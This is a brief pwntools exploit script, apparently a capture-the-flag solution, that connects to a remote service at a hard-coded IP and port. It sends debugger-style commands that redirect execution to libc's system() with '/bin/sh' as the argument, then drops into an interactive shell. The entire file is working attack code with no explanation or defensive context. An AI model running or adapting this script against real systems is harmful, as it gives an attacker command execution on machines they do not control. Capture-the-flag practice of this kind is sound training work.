from pwn import *

libc = ELF("./libc.so.6") # taken from docker image
conn = remote("34.91.79.108", 1337)

conn.sendline(f"set $rdi=$rip+({next(libc.search(b'/bin/sh'))-libc.sym.read})".encode())
conn.sendline(f"set $rip=$rip+({libc.sym.system-libc.sym.read})".encode())
conn.sendline(b"continue")

conn.interactive()
